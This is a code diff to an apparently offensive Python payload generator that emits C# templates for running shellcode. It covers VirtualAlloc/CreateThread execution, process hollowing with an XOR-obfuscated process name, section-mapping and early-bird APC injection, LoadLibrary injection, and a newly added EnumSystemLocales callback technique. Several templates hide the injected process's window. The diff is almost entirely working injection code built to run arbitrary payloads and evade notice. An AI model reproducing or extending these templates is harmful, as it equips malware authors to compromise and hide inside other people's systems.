@@ -276,20 +276,13 @@ START_PROCESS_INJECT_PINVOKE_IMPORT = ["VirtualAllocEx",
                                       "CreateRemoteThread",
                                       "ShowWindow",]
 
-START_SHELLCODE_PINVOKE_IMPORT = ["VirtualAlloc",
-                                 "CreateThread",
-                                 "WaitForSingleObject",]
-
 START_SHELLCODE_CODE = """
-            UInt32 MEM_COMMIT = 0x3000;
-            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
-            IntPtr hThread = IntPtr.Zero;
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
             UInt32 threadId = 0;
             IntPtr pinfo = IntPtr.Zero;
             // execute native code
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, pinfo, 0, IntPtr.Zero);
             WaitForSingleObject(hThread, 0xFFFFFFFF);
             return;
 """
@@ -320,11 +313,6 @@ START_PROCESS_INJECT = """
           }
 """
 
-START_PROCESS_HOLLOW_PINVOKE_IMPORT =  ["CreateProcess",
-                                       "ZwQueryInformationProcess",
-                                       "ReadProcessMemory",
-                                       "WriteProcessMemory",
-                                       "ResumeThread",]
 
 START_PROCESS_HOLLOW_CODE_IMPORT = """
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
@@ -373,6 +361,13 @@ START_PROCESS_HOLLOW_CODE_IMPORT = """
 """
 
 START_PROCESS_HOLLOW_CODE = """
+    byte[] procname = new byte[] {{ {xor_path} }};
+
+    for (int i = 0; i < procname.Length; i++)
+    {{
+        procname[i] = (byte)(((uint)procname[i] ^ {xor_key}) & 0xFF);
+    }}
+
       STARTUPINFO si = new STARTUPINFO();
 
       PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
@@ -406,13 +401,6 @@ START_PROCESS_HOLLOW_CODE = """
       WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
       ResumeThread(pi.hThread);
 """
-
-START_PROCESS_INTERPROCESS_PINVOKE_IMPORT = ["NtUnmapViewOfSection",
-                                            "NtClose",
-                                            "NtCreateSection",
-                                            "NtMapViewOfSection",
-                                            "RtlCreateUserThread",
-                                            "ShowWindow"]
 
 START_PROCESS_INTERPROCESS_CODE_IMPORT = """
 
@@ -469,8 +457,8 @@ START_PROCESS_INTERPROCESS_CODE = """
           start.CreateNoWindow = false;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
-          {
-              if (proc != null) {
+          {{
+              if (proc != null) {{
                 int pid = proc.Id;
               Process target = Process.GetProcessById(pid);
               IntPtr hSectionHandle = IntPtr.Zero;
@@ -488,21 +476,10 @@ START_PROCESS_INTERPROCESS_CODE = """
               RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
               System.Threading.Thread.Sleep(100);
               ShowWindow(proc.MainWindowHandle, 0);
-              }
-         }
+              }}
+         }}
 """
 
-
-START_PROCESS_EARLYBIRD_PINVOKE_IMPORT = ["VirtualAllocEx2",
-                                         "OpenProcess",
-                                         "CreateRemoteThread2",
-                                         "QueueUserAPC",
-                                         "ResumeThread",
-                                         "CloseHandle",
-                                         "NtWriteVirtualMemory",
-                                         "RtlZeroMemory",
-                                         "WaitForSingleObject",
-                                         "ShowWindow",]
 
 START_PROCESS_EARLYBIRD_CODE_IMPORT = """
                 [Flags]
@@ -579,8 +556,8 @@ START_PROCESS_EARLYBIRD_CODE = """
           start.CreateNoWindow = false;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
-          {
-            if (proc != null) {
+          {{
+            if (proc != null) {{
               int pid = proc.Id;
               IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, pid);
               IntPtr VAlloc_address = VirtualAllocEx(
@@ -612,17 +589,10 @@ START_PROCESS_EARLYBIRD_CODE = """
               CloseHandle(Thread_handle);
               System.Threading.Thread.Sleep(100);
               ShowWindow(proc.MainWindowHandle, 0);
-            }
-            }
+            }}
+            }}
 """
 
-START_PROCESS_LOADLIBA_PINVOKE_IMPORT = ["OpenProcess",
-                                      "VirtualAllocEx",
-                                      "WriteProcessMemory",
-                                      "GetProcAddress",
-                                      "CreateRemoteThread",
-                                      "WaitForSingleObject",
-                                     "GetModuleHandle"]
 START_PROCESS_LOADLIBA_CODE_IMPORT = """
 """
 
@@ -647,12 +617,8 @@ START_PROCESS_LOADLIBA_CODE = """
         uint result = WaitForSingleObject(remoteThread, 5 * 1000);
 """
 
-START_PROCESS_JMP_PINVOKE_IMPORT = ["VirtualProtect"]
-START_SHELLCODE_JMP_CODE_IMPORT = """
-public const uint PAGE_EXECUTE_READ = 0x20;
-"""
-
 JMP_SHELLCODE = """
+        uint PAGE_EXECUTE_READ = 0x20;
         IntPtr address = Marshal.AllocHGlobal(shellcode.Length);
         Marshal.Copy(shellcode, 0, address, shellcode.Length);
         uint oldProtection;
@@ -662,13 +628,58 @@ JMP_SHELLCODE = """
         executeAssembly();
 """
 
+CALLBACK_ENUMSYSLOCALES = """
+IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x00000004);
+Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+uint oldProtect;
+bool retval = VirtualProtect(addr, (UIntPtr)shellcode.Length, 0x20, out oldProtect);
+if (retval) {{
+  EnumSystemLocales(addr,0);
+}}
+"""
+
 import_choices_pinvoke_import = {
-  'hollow':START_PROCESS_HOLLOW_PINVOKE_IMPORT,
-  'interprocess':START_PROCESS_INTERPROCESS_PINVOKE_IMPORT,
-  'earlybird':START_PROCESS_EARLYBIRD_PINVOKE_IMPORT,
-  'standard':START_SHELLCODE_PINVOKE_IMPORT,
-  'loadliba':START_PROCESS_LOADLIBA_PINVOKE_IMPORT,
-  'jmp': START_PROCESS_JMP_PINVOKE_IMPORT,
+  'hollow': ["CreateProcess",
+             "ZwQueryInformationProcess",
+             "ReadProcessMemory",
+             "WriteProcessMemory",
+             "ResumeThread"],
+
+  'interprocess': ["NtUnmapViewOfSection",
+                  "NtClose",
+                  "NtCreateSection",
+                  "NtMapViewOfSection",
+                  "RtlCreateUserThread",
+                  "ShowWindow"],
+
+  'earlybird':["VirtualAllocEx2",
+              "OpenProcess",
+              "CreateRemoteThread2",
+              "QueueUserAPC",
+              "ResumeThread",
+              "CloseHandle",
+              "NtWriteVirtualMemory",
+              "RtlZeroMemory",
+              "WaitForSingleObject",
+              "ShowWindow"],
+
+  'standard':["VirtualAlloc",
+              "CreateThread",
+              "WaitForSingleObject"],
+
+  'loadliba': ["OpenProcess",
+               "VirtualAllocEx",
+               "WriteProcessMemory",
+               "GetProcAddress",
+               "CreateRemoteThread",
+               "WaitForSingleObject",
+               "GetModuleHandle"],
+
+  'jmp': ["VirtualProtect"],
+
+  'callback-esl': ["VirtualAlloc",
+                   "VirtualProtect",
+                   "EnumSystemLocales"],
 }
 
 import_choices_code_import = {
@@ -677,24 +688,18 @@ import_choices_code_import = {
   'earlybird':f"{START_PROCESS_EARLYBIRD_CODE_IMPORT}",
   'standard':"",
   'loadliba':f"{START_PROCESS_LOADLIBA_CODE_IMPORT}",
-  'jmp':f"{START_SHELLCODE_JMP_CODE_IMPORT}",
+  'jmp':"",
+  'callback-esl':"",
 }
 
 main_choices = {
-  'hollow':"""
-    byte[] procname = new byte[] {{ {xor_path} }};
-
-    for (int i = 0; i < procname.Length; i++)
-    {{
-        procname[i] = (byte)(((uint)procname[i] ^ {xor_key}) & 0xFF);
-    }}
-
-    {ak.START_PROCESS_HOLLOW_CODE}""",
-  'interprocess':"{ak.START_PROCESS_INTERPROCESS_CODE}",
-  'earlybird':"{ak.START_PROCESS_EARLYBIRD_CODE}",
-  'standard':"{ak.START_SHELLCODE_CODE}",
-  'loadliba':START_PROCESS_LOADLIBA_CODE,
-  'jmp':"{ak.JMP_SHELLCODE}",
+  'hollow': START_PROCESS_HOLLOW_CODE,
+  'interprocess': START_PROCESS_INTERPROCESS_CODE,
+  'earlybird': START_PROCESS_EARLYBIRD_CODE,
+  'standard': START_SHELLCODE_CODE,
+  'loadliba': START_PROCESS_LOADLIBA_CODE,
+  'jmp': JMP_SHELLCODE,
+  'callback-esl': CALLBACK_ENUMSYSLOCALES,
 }
 
 def get_pinvoke_import(pinvoke):
